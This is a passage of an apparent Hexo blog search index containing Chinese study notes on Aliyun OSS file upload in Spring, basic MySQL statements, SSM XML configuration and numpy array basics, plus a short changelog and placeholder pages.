class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ll.aliyunoss.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by a handsome man</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: mental_test</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/12/08/22:42</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 交给spring管理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OssUtils</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取配置文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.endpoint&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String endpoint;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.keyid&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String keyid;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.keysecret&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String keysecret;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;aliyun.oss.file.bucketname&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String bucketname;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义公开静态常量</span></span><br><span class="line"><span class="comment">     * 当下面值初始化完成后接口会执行</span></span><br><span class="line"><span class="comment">     * 通过下面的公共方法就可以在别处引用变量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String ENDPOINT;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String KEY_ID;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String KEY_SECRET;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String BUCKET_NAME;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ENDPOINT = endpoint;</span><br><span class="line">        KEY_ID = keyid;</span><br><span class="line">        KEY_SECRET = keysecret;</span><br><span class="line">        BUCKET_NAME = bucketname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="具体执行代码"><a href="#具体执行代码" class="headerlink" title="具体执行代码"></a>具体执行代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">     <span class="comment">// 获取oss参数</span></span><br><span class="line">     <span class="type">String</span> <span class="variable">endpoint</span> <span class="operator">=</span> OssUtils.ENDPOINT;</span><br><span class="line">     <span class="type">String</span> <span class="variable">keyId</span> <span class="operator">=</span> OssUtils.KEY_ID;</span><br><span class="line">     <span class="type">String</span> <span class="variable">keySecret</span> <span class="operator">=</span> OssUtils.KEY_SECRET;</span><br><span class="line">     <span class="type">String</span> <span class="variable">bucketName</span> <span class="operator">=</span> OssUtils.BUCKET_NAME;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">OSS</span> <span class="variable">ossClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OSSClientBuilder</span>().build(endpoint, keyId, keySecret);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 文件上传工作流</span></span><br><span class="line">         <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> file.getInputStream();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 获取文件名称</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="comment">// **若文件名重复，新的会自动覆盖旧的文件，所以需要对文件进行区分</span></span><br><span class="line">         <span class="comment">// 此处我用的是时间日期分类</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">datePath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DateTime</span>().toString(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">         <span class="comment">// 拼接</span></span><br><span class="line">         filename = datePath + filename;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 调用oss方法实现上传</span></span><br><span class="line">         <span class="comment">// 参数1：Bucket名称</span></span><br><span class="line">         <span class="comment">// 参数2：上传到oss的文件路径和文件名</span></span><br><span class="line">         <span class="comment">// 参数3： 上传文件输入流</span></span><br><span class="line">         ossClient.putObject(bucketName,filename,inputStream);</span><br><span class="line">         <span class="comment">// 关闭流</span></span><br><span class="line">         ossClient.shutdown();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 上传完文件后将文件路径返回</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;https://&quot;</span> + bucketName + <span class="string">&quot;.&quot;</span> + endpoint + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">return</span> url;</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> java笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>常用sql语句</title>
+      <link href="/2022/12/05/%E5%B8%B8%E7%94%A8sql/"/>
+      <url>/2022/12/05/%E5%B8%B8%E7%94%A8sql/</url>
+      
+        <content type="html"><![CDATA[<h5 id="展示所有数据库"><a href="#展示所有数据库" class="headerlink" title="展示所有数据库"></a>展示所有数据库</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases</span><br></pre></td></tr></table></figure><h5 id="创建一个student-grade表"><a href="#创建一个student-grade表" class="headerlink" title="创建一个student_grade表"></a>创建一个student_grade表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student_grade(</span><br><span class="line">id <span class="type">int</span>,</span><br><span class="line">name <span class="type">VARCHAR</span>(<span class="number">20</span>),</span><br><span class="line">enligsh <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>),</span><br><span class="line">math <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>),</span><br><span class="line">chinese <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><em>此处enligsh为故意写错，方便下面修改示范</em></p><h5 id="插入两个数据"><a href="#插入两个数据" class="headerlink" title="插入两个数据"></a>插入两个数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student_grade ( id, NAME, enligsh, math, chinese )</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;李狗蛋&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>),</span><br><span class="line">(<span class="number">2</span>,<span class="string">&#x27;聪明的李某人&#x27;</span>,<span class="number">99</span>,<span class="number">99</span>,<span class="number">99</span>);</span><br></pre></td></tr></table></figure><h5 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span> student_grade</span><br></pre></td></tr></table></figure><p>此时发现enligsh拼写错误</p><h5 id="修改字段名"><a href="#修改字段名" class="headerlink" title="修改字段名"></a>修改字段名</h5><p>参考例句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE 旧字段名 新字段名 新数据类型;</span><br></pre></td></tr></table></figure><p>此处所用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student_grade CHANGE enligsh  english <span class="type">DECIMAL</span>(<span class="number">3</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这个方法也可以用来修改指定字段的数据类型，<strong><em>但是修改字段类型需要保证改后的数据类型能兼容之前的数据</em></strong>，例如此处我修改name的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student_grade CHANGE name name <span class="type">VARCHAR</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> java笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ssm构建笔记</title>
+      <link href="/2022/12/04/ssm%E7%AC%94%E8%AE%B0/"/>
+      <url>/2022/12/04/ssm%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ssm笔记"><a href="#ssm笔记" class="headerlink" title="ssm笔记"></a>ssm笔记</h1><h3 id="原始版构建方式"><a href="#原始版构建方式" class="headerlink" title="原始版构建方式"></a>原始版构建方式</h3><ol><li><p>alt+insert添加依赖，引入spring-webmvc依赖</p></li><li><p>open moudle setting 配置web中的web Resource Directories路径和Deployment Descriptos路径</p></li><li><p>创建任意controller</p></li><li><p>于resources文件夹中创建applicationContext.xml和spring-servlet.xml</p></li><li><p>applicationContext.xml配置，先配置需要扫描的包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- base-package 表示要扫描的包；use-default-filters表示使用默认的过滤器，true表示全扫--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;org.ll&quot;</span> <span class="attr">use-default-filters</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--除去controller，其他的都扫--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">experssion</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--下面可配mybatis--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>spring-servlet.xml的配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--不使用默认的过滤器，需要指定扫描的包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;org.ll&quot;</span> <span class="attr">user-default-filters</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--包括哪个，即指定哪个包--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--视图解析器等在下面配--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>web.xml文件配置</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--加载spring的配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--spring mvc的配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> java笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>numpy数据分析</title>
+      <link href="/2022/12/04/numpy%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
+      <url>/2022/12/04/numpy%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h2 id="我的博客部署成功了"><a href="#我的博客部署成功了" class="headerlink" title="我的博客部署成功了"></a>我的博客部署成功了</h2><h1 id="numpy数据分析"><a href="#numpy数据分析" class="headerlink" title="numpy数据分析**"></a>numpy数据分析**</h1><h2 id="numpy模块"><a href="#numpy模块" class="headerlink" title="numpy模块"></a>numpy模块</h2><h3 id="数组存在优先级："><a href="#数组存在优先级：" class="headerlink" title="数组存在优先级："></a>数组存在优先级：</h3><ol><li>字符串&gt;浮点型&gt;整数</li></ol><h3 id="数组常用方法："><a href="#数组常用方法：" class="headerlink" title="数组常用方法："></a>数组常用方法：</h3><ol><li><p>zero()</p></li><li><p>ones()</p></li><li><p>linspace()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.linspace(<span class="number">0</span>,<span class="number">100</span>,num=<span class="number">20</span>)  <span class="comment"># 返回从0大100的20个数的一维等差数列对应的数组</span></span><br></pre></td></tr></table></figure><p>​</p></li><li><p>arange()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.arange(<span class="number">10</span>,<span class="number">50</span>,step=<span class="number">2</span>)  <span class="comment"># 返回从10到50（不包括50）,步数为2的等差数列对应的一维数组</span></span><br></pre></td></tr></table></figure><p>​</p></li><li><p>random系列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.random.randint(<span class="number">0</span>,<span class="number">100</span>,size=(<span class="number">5</span>,<span class="number">3</span>)) <span class="comment"># 返回0到100间的五行三列的二维随机数</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="numpy常用属性"><a href="#numpy常用属性" class="headerlink" title="numpy常用属性"></a>numpy常用属性</h3><ol><li><p>shape   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.shape  <span class="comment"># 数组的形状，几行几列</span></span><br></pre></td></tr></table></figure></li><li><p>ndim</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.ndim  <span class="comment"># 返回的是数组的维度</span></span><br></pre></td></tr></table></figure></li><li><p>size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.size  <span class="comment"># 返回数组元素的个数</span></span><br></pre></td></tr></table></figure></li><li><p>dtype</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.dtype <span class="comment"># 返回是数组元素类型题</span></span><br></pre></td></tr></table></figure></li></ol><p>创建数组并制定元素类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],dtype=<span class="string">&#x27;int64&#x27;</span>)</span><br></pre></td></tr></table></figure><p>修改数组元素类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.dtype = <span class="string">&#x27;uint8&#x27;</span> <span class="comment"># 修改数组的元素类型</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> python笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>更新日志</title>
+      <link href="/2022/12/01/%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/"/>
+      <url>/2022/12/01/%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97/</url>
+      
+        <content type="html"><![CDATA[<h3 id="2022-12-1更新内容"><a href="#2022-12-1更新内容" class="headerlink" title="2022-12-1更新内容"></a>2022-12-1更新内容</h3><p>1.修改博客音乐播放器，原网易云，现QQ音乐<br>2.因为收到大量广告评论，现关闭评论功能<br>3.更改网页图标<br>4.更改图片显示方式，增快读取速度。（但是因为使用vercel部署的原因，国内访问还是较慢，但是能接受，以后再想办法）</p><h3 id="2022-12-1更新内容-1"><a href="#2022-12-1更新内容-1" class="headerlink" title="2022-12-1更新内容"></a>2022-12-1更新内容</h3><p>1.修改标签和分类<br>2.修补部分显示错误</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 读书笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 日志 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>测试文章</title>
+      <link href="/2022/11/28/next1/"/>
+      <url>/2022/11/28/next1/</url>
+      
+        <content type="html"><![CDATA[<h2 id="这是一个测试文章"><a href="#这是一个测试文章" class="headerlink" title="这是一个测试文章"></a>这是一个测试文章</h2><p>以下为文章格式测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> java笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>欢迎来到我的博客</title>
+      <link href="/2022/11/26/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
+      <url>/2022/11/26/%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
+      
+        <content type="html"><![CDATA[<!-- # 本地图片 --><!-- <img src="/assets/pusheencode.webp" alt="示例图片" style="zoom:50%;" /> --><h1 id="一起变强吧🚅"><a href="#一起变强吧🚅" class="headerlink" title="一起变强吧🚅"></a>一起变强吧🚅</h1><p><img src="https://w.wallhaven.cc/full/ex/wallhaven-exyp3k.jpg" alt="code"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+    
+    
+    <entry>
+      <title>关于</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
+      
+        <content type="html"><![CDATA[<!-- GitCalendar容器 --><h2 id="github贡献图"><a href="#github贡献图" class="headerlink" title="github贡献图"></a>github贡献图</h2><div id="gitHub"></div>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>归档</title>
+      <link href="/archives/index.html"/>
+      <url>/archives/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/css/custom.css"/>
+      <url>/css/custom.css</url>
+      
